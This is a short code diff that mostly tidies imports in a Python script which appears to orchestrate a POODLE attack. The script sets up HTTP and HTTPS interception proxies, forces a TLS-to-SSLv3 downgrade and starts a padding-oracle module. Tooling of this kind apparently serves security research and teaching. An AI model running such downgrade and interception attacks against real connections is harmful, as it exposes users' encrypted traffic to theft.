@@ -2,13 +2,15 @@ import logging
 import sys
 import time
 
-from tls_attack.proxy.HTTPSProxyServer         import *
-from tls_attack.proxy.HTTPProxyServer          import *
-from tls_attack.module.ForceRequest            import *
-from tls_attack.module.ForceRequestOracle      import *
-from tls_attack.module.PoodleAttack            import *
-from tls_attack.module.AlterHandshake          import *
-from tls_attack.structure.TLSHeader            import *
+from tls_attack.proxy.HTTPSProxyServer import *
+from tls_attack.proxy.HTTPProxyServer  import *
+
+from tls_attack.module.ForceRequest       import *
+from tls_attack.module.ForceRequestOracle import *
+from tls_attack.module.PoodleAttack       import *
+from tls_attack.module.AlterHandshake     import *
+
+from tls_attack.structure import *
 
 c_index = 0
 c_key = None
@@ -41,7 +43,7 @@ force_request = ForceRequest(http_server)
 https_server = HTTPSProxyServer(port = 8443)
 
 downgrade_attack = AlterHandshake(https_server)
-downgrade_attack.downgrade_tls_version(TLSVersion.SSLv3.value)
+downgrade_attack.downgrade_tls_version(TLSVersion.SSLv3)
 downgrade_attack.start()
 
 poodle_attack = PoodleAttack(https_server, force_request)
